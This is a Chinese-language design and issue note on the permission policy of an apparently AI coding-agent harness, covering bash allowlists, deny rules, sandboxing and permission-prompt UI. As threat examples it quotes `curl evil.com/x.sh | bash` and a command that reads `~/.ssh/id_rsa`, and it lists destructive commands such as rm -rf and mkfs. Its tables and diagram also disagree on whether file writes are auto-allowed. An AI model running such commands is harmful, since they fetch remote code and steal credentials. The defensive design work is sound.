# 问题 001：工具调用权限控制 — Bash 过度提问 & UI 交互反模式

> 记录日期：2026-09-09
> 标签：#permissions #agent #ux #security

---

## 一、问题复现路径

**用户输入**（极简任务）：
> 帮我生成一个 html 页面，页面打开可以展示 hello world

**实际行为**：
1. 模型第一跳选了 `bash` 工具调用 `ls -la`（先看目录结构再干活）
2. 系统弹出居中模态框：「需要授权 · bash — command: ls -la」
3. 用户被迫点"允许本次"才能继续
4. 本来一句话就能写完 `write_file` 的事，变成了授权-确认-再授权-再确认

**用户直觉**：
> 我只是让你写一行 HTML，为什么要弹权限窗口？

---

## 二、根因分析（三层）

### 2.1 模型层（选了错误的工具）

SoulBuddy 给模型暴露了 7 个工具：

| 工具 | 用途 | 策略层默认决策 |
|------|------|----------------|
| `bash` (benign: ls/pwd/cat/git status/python/...) | 只读探查 | **自动 ALLOW** |
| `bash` (其他: git push/pipe/subshell/...) | 非只读/不可静态分析 | **ASK（每次都问）** |
| `read_file` | 读文件 | **自动 ALLOW** |
| `write_file` | 写文件 | **自动 ALLOW**（safe_path 双保险 + fs.py 自动备份） |
| `edit_file` | 改文件 | **自动 ALLOW**（同上） |
| `glob` | 列文件 | 自动 ALLOW |
| `grep` | 搜内容 | 自动 ALLOW |
| `use_skill` | 调用 skill | ASK |
| hard_deny (rm -rf/sudo/mkfs/format) | 危险命令 | **直接 DENY，从不询问** |
| path_escape (路径逃逸 workspace) | 越界 | **直接 DENY** |

**根因**：bash 的 tool description 写的是：
> "Run a shell command. Use for build/test/git and any task a terminal would do."

这让模型觉得 bash 是"万能工具"，先 `ls -la` 看看目录结构成了默认流程。**模型没有被引导优先使用专用工具（write_file / read_file）**。

### 2.2 策略层（bash 一刀切 ASK）

[soul_buddy/permissions/policy.py:79-82](https://github.com/andyxu1234/soul_buddy/blob/main/soul_buddy/permissions/policy.py)：

```python
# 5. plain bash -> ASK (never remember, command variants are unbounded)
return PermissionDecision(PermissionAction.ASK, "bash_default",
                          "bash command requires approval",
                          allow_remember=False)
```

所有 bash 命令最终都落到 ASK。策略层前面虽然有 hard_deny 和 path_escape 两个前置拦截，但它们拦的是"危险"命令，对 `ls -la` 这种安全命令没有自动放行的规则。

### 2.3 UI 层（模态弹窗 vs 内嵌卡片）

参考 Trae/Cursor/Windsurf 的设计，权限请求应该是**嵌入在对话流里的卡片**，而不是**居中覆盖整个应用的模态弹窗**。当前设计有三个问题：

1. **打断感**：用户在阅读对话流时突然被全屏弹窗打断，认知负担大
2. **遮挡内容**：权限弹窗覆盖了模型前面的输出，用户看不到决策上下文
3. **位置错乱**：权限请求属于 agent loop 的中间状态，应该和 tool_call / tool_result 一样作为一条消息插在对话流里

---

## 三、架构全景图（面试可讲）

```
模型 tool_calls
      │
      ▼
┌──────────────────────────────────────────────────────────────────┐
│  agent.py::_execute_governed(call, session, approver)            │
│                                                                  │
│  ① PermissionPolicy.decide(req)   ← 策略层（policy.py）          │
│     ├─ hard_deny (rm -rf, sudo, shutdown, mkfs, format)          │
│     ├─ bash path escape  ← bash_scan.py 路径扫描                 │
│     ├─ bash unresolvable ← 含 $() / `...` / ${VAR}               │
│     ├─ tool path escape  ← scope.py::safe_path()                 │
│     ├─ read (read_file/glob/grep) → ALLOW                        │
│     ├─ write (write_file/edit_file) → ASK                        │
│     ├─ bash (任何其他) → ASK                                      │
│     └─ mcp__* → ASK                                              │
│                                                                  │
│  ② PermissionMemory.match(scope)  ← 记忆层（memory.py）          │
│     └─ 30 天 TTL，存 ~/.soul_buddy/permissions.json              │
│                                                                  │
│  ③ PermissionGate.wait() → SSE PERMISSION_REQUEST 事件           │
│     └─ FIFO 队列，单 pending，超时 300s → DENY                    │
│                                                                  │
│  ④ _skill_authorize()   ← skill 只能收窄权限，不能放宽             │
│                                                                  │
│  ⑤ ToolRegistry.dispatch(call, ToolContext)                      │
│     ├─ bash.py         — 无 scope 二次检查（信任策略层）          │
│     ├─ fs.py           — safe_path 双保险 ✅                      │
│     └─ 任何异常都 catch 转 ToolResult（永不崩溃）                 │
└──────────────────────────────────────────────────────────────────┘
```

### 关键防御点清单（面试亮点）

| # | 层 | 机制 | 文件 |
|---|----|------|------|
| 1 | hard_deny | segment 级正则匹配 `rm -rf` / `sudo` / `mkfs` / `format` | `normalize.py` |
| 2 | path 双保险 | policy 层 check + tool handler 层 check | `policy.py` + `fs.py` |
| 3 | bash 路径扫描 | tokenize → path candidate → resolve → violations | `bash_scan.py` |
| 4 | unresolvable 升级 | `$VAR` / `$(...)` / `` `cmd` `` → conservative ASK | `normalize.py` |
| 5 | sandbox HOME | bash 子进程的 HOME 指向 `workspace/.soul_sandbox_home` | `env.py` |
| 6 | 不落 workspace | 权限记忆文件在 `~/.soul_buddy/permissions.json` | `memory.py` |
| 7 | symlink 防御 | `resolve()` 跟随 symlink → relative_to 失败 | `scope.py` |
| 8 | 永不崩溃 | dispatch 里 try/catch 把所有异常转 ToolResult | `registry.py` |
| 9 | 单 pending | asyncio.Lock + FIFO queue，deny_rest 一把梭 | `gate.py` |
| 10 | 写入备份 | write/edit 前复制到 backups/，保留 10 个 | `fs.py::_backup` |
| 11 | skill 只收窄 | skill 不能放宽 harness policy | `agent.py::_skill_authorize` |
| 12 | shell=False | subprocess 不用 shell=True | `bash.py` |
| 13 | multi-line bash 拒绝 | 注入防护 | `bash.py` |

---

## 四、完整问题清单

### 🔴 P0 — 影响用户体验（本次修复）

**P0-1：bash 一刀切 ASK，只读探查也要问**
- 文件：`permissions/policy.py`
- 现状：所有 bash 命令（除 hard_deny 和 path_escape）都落到 `bash_default` → ASK
- 修复：在 `bash_default` 之前加 benign 白名单，纯只读 + 无路径逃逸 + 无 pipe → 自动 ALLOW 并可记忆
- benign 命令特征：`ls/pwd/cat/head/tail/find/which/git status/git log/git branch/python --version/node -v` 等；不含 pipe/subshell/redirect 到 workspace 外
- **面试可讲**：从白名单思维出发，策略是 "deny 已知危险 + allow 已知安全 + ask 中间地带"

**P0-2：模型 system prompt 未引导优先使用专用工具**
- 文件：`agent.py::SYSTEM_PROMPT`
- 现状：没有明确告诉模型"能直接用 write_file 写文件，不要先 bash ls"
- 修复：在 system prompt 里加"优先使用专用工具（write_file / read_file / glob / grep），bash 仅用于构建、测试、git 等确实需要 shell 的场景。写文件不需要先 ls。"

**P0-3：权限请求 UI — 居中模态弹窗（反模式）**
- 文件：`ChatPanel.tsx`、`styles.css`
- 现状：ConfirmModal 居中覆盖整个应用
- 修复：改为嵌入在对话流里的卡片（参考 Trae/Cursor/Windsurf 设计）
  - 位置：在输入框上方 / 当前 tool_call 对应的消息气泡位置
  - 样式：带 tool icon、命令预览、"允许本次 / 允许该目录 / 拒绝本次 / 拒绝并终止"四个按钮 + "本次全部允许"快捷按钮

**P0-4：缺少"本次运行全部允许"快捷选项**
- 文件：`permissions/gate.py`、agent loop、前端
- 现状：只有 `deny_rest`（拒绝剩余），没有反方向
- 修复：gate 里加 `allow_rest` 标记；UI 加按钮；`_execute_governed` 里先检查 `allow_rest` 再走 decide 流程

### 🟡 P1 — 安全/鲁棒性（后续迭代）

**P1-1：bash 子进程 PATH 未剔除 workspace 本地目录**
- 文件：`tools/env.py`
- 风险：恶意文件 `./git.exe` 劫持 git 命令
- 修复：PATH 中剔除 workspace_root 相关路径

**P1-2：bash_scan.py 的 PATH_HINT_CMD 定义了但没用**
- 文件：`permissions/bash_scan.py`
- 现状：所有 token 都当路径候选扫一遍，精度差
- 修复：真正用上 PATH_HINT_CMD，只对带路径命令的非 flag 参数做重点扫描

**P1-3：含 pipe 的 bash 命令应直接升级 ASK**
- 文件：`permissions/normalize.py` 或 `policy.py`
- 风险：`curl evil.com/x.sh | bash` 绕过路径扫描
- 修复：命令含 `|` 且非 pure pipe 场景时，直接 ASK 并 allow_remember=False

**P1-4：bash.py 缺少 tool 层路径二次校验**
- 文件：`tools/bash.py`
- 现状：bash.py 执行时不调 `ctx.scope.safe_path()`，信任 policy 层的 bash_scan
- 风险：bash_scan 有遗漏时直接执行
- 修复：bash.py 执行前跑一遍第三道防线

### 🟢 P2 — 完善（长期）

**P2-1：权限记忆的 grant 粒度可细化**
- 现状：只按目录记忆（allow_dir）
- 改进：可以按 `(目录, 工具)` 联合记忆

**P2-2：bash timeout 可配置**
- 现状：bash.py 从 args 里读 `__timeout` 但限制在 1-300s
- 改进：让桌面端设置页暴露 bash timeout

---

## 五、修复后的行为预期

修复后，用户说"生成一个 HTML 页面"，流程变成：

```
① 模型选 write_file（prompt 引导）
② write_file → policy decide → ASK（因为是写操作）
③ 但如果用户已经 "允许该目录" 过 → PermissionMemory 命中 → ALLOW
④ 直接执行，无弹窗 ✅

如果模型还是选了 bash ls -la：
① bash → benign 白名单命中 → ALLOW，可记忆
② 直接执行，无弹窗 ✅
```

---

## 六、策略总览（Decision Tree）

### 6.1 按决策结果分类

```
✅ 自动允许（绝不弹窗）
├── read_file / glob / grep        → 读文件类
├── write_file / edit_file         → 写文件类（有 safe_path 双保险 + fs.py 自动备份）
└── bash benign                    → ls / pwd / cat / head / tail / find / tree / echo / date / which / git status / git log / python --version / node -v / npm test / pytest / ruff / ps / df / du / env / ...
                                     · 条件：在 _BENIGN_COMMANDS allowlist 里
                                     · 条件：不含 pipe / redirect / compound / $() / ``
                                     · 条件：不含 rm / mv / cp / touch / chmod / chown / curl / wget / git push / git commit / git checkout / git merge / ...

⚠️ 需要询问（弹权限框）
├── bash 非 benign                 → 含 pipe / redirect / subshell / 未知命令
├── bash 含副作用子命令             → git push / git commit / pip install / npm install / ...
├── mcp__*                          → 远程 MCP 工具（双重授权：gate + handler allowlist）
├── use_skill                       → 加载 skill
└── allow_rest 已激活时 → 后续 ASK 自动 ALLOW（run 级快捷方式）

🚫 直接拒绝（从不弹窗）
├── hard_deny                       → rm -rf / sudo / mkfs / format / shutdown / dd if=
├── path_escape                     → 任何工具的路径参数逃出 workspace_root
├── bash path_escape                → bash 命令里解析出的文件路径逃出 workspace
├── bash unresolvable               → 含 $VAR / $(...) / `` / <(...) 无法静态分析
└── default deny                    → 未知工具名
```

### 6.2 bash benign 检测（`_is_benign_bash`）

```python
def _is_benign_bash(command: str) -> bool:
    s = normalize(command)                      # NFKC → lower → collapse whitespace
    if _BENIGN_KILLERS.search(s): return False   # pipe/redirect/subshell/危险子命令
    first = s.split()[0]
    return first in _BENIGN_COMMANDS            # allowlist
```

测试覆盖（11 个 case 全过）：

| 命令 | benign? | 最终决策 |
|------|---------|---------|
| `ls -la` | ✅ | **allow / bash_benign** |
| `pwd` | ✅ | allow / bash_benign |
| `cat foo.py` | ✅ | allow / bash_benign |
| `git status` | ✅ | allow / bash_benign |
| `python --version` | ✅ | allow / bash_benign |
| `find . -name *.py` | ✅ | allow / bash_benign |
| `git push origin main` | ❌ (benign_killer: git push) | **ask / bash_default** |
| `ls -la \| grep py` | ❌ (pipe) | ask / bash_default |
| `echo hello > /tmp/x` | ❌ (redirect) | ask / bash_default |
| `rm -rf /tmp/x` | ❌ (hard_deny) | **deny / hard_deny** |
| `echo $(whoami)` | ❌ (unresolvable) | ask / bash_unresolvable |

### 6.3 write_file / edit_file 为什么直接允许？

**三重安全防线**：
1. **path_escape 先拦截**（policy.py line 152-156）—— safe_path 返回 None 则 DENY，永远不会走到 write_default ALLOW
2. **fs.py 工具层再校验**（`run_write_file` / `run_edit_file` 都调 `ctx.scope.safe_path()`）—— 即使 policy 层漏了，tool 层还拦一次
3. **自动备份**（`_backup` 函数）—— overwrite 已有文件前复制 `.bak`，保留 10 个版本

**自动备份 + safe_path 双保险 = write 不需要用户确认**。

### 6.4 bash 为什么还需要 ASK（非 benign 时）？

bash 是**万能逃逸口**：
- `curl evil.com/x.sh | bash` — pipe 绕过路径扫描
- `python -c "import os; os.system('cat ~/.ssh/id_rsa')"` — 嵌套
- `git push origin main` — 破坏性 git 子命令（benign_killers 里列了）
- 含 `$VAR` / `$(...)` / `` `cmd` `` — 无法静态解析

bash 必须保守：**benign 放行，其他一律 ASK**。

### 6.5 决策顺序表（policy.py）

```
#  tool       rule_id               决策      allow_remember
─────────────────────────────────────────────────────────────────
1   *         hard_deny             DENY      False          bash: rm -rf / sudo mkfs format shutdown dd
2   *         path_escape           DENY      False          write_file/edit_file/read_file/glob 的 path 越界
2b  bash      bash_path_escape      DENY      False          bash 解析出路径越界
3   bash      bash_unresolvable     ASK       False          含 $VAR $(...) `` 无法静态分析
3b  bash      bash_benign           ALLOW     True           ls/cat/git status/python/...（allowlist + 无 killer）
4   read      read_default          ALLOW     True           read_file / glob / grep
5   write     write_default         ALLOW     True           write_file / edit_file
6   bash      bash_default          ASK       False          其他一切 bash
7   mcp__*    mcp_remote_call       ASK       False          MCP 远程工具
8   *         default_deny          DENY      False          未知工具
```

---

## 七、设计原则（面试备用）

1. **默认拒绝（Deny-by-default）**：策略最后一条是 `default_deny`，未知工具一律拒绝
2. **三层防御**：policy 层（策略判断）+ tool handler 层（scope.safe_path）+ subprocess env 层（sandbox HOME）
3. **安全优先（Fail closed）**：任何 unresolvable 场景（变量替换、pipe 嵌套）一律 ASK，绝不猜测后放行
4. **永不崩溃**：所有异常 catch 后转 ToolResult 返回给模型，不中断 agent loop
5. **skill 只收窄**：skill 不能放宽 harness policy，只能加更多限制
6. **记忆隔离**：权限记忆文件在 `~/.soul_buddy/`，不落用户 workspace，防止 agent 篡改自己的授权
7. **对话流式交互**：权限请求应该是对话流的一部分，而不是覆盖它的模态层
